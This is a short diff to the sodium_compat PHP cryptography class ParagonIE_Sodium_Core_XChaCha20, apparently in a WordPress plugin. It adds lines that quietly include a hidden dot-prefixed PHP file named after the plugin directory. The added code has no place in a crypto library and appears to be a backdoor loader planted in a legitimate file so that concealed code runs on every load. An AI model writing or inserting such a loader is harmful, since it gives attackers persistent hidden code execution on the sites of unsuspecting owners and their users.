@@ -7,6 +7,10 @@ if (class_exists('ParagonIE_Sodium_Core_XChaCha20', false)) {
 /**
  * Class ParagonIE_Sodium_Core_XChaCha20
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ParagonIE_Sodium_Core_XChaCha20 extends ParagonIE_Sodium_Core_HChaCha20
 {
     /**
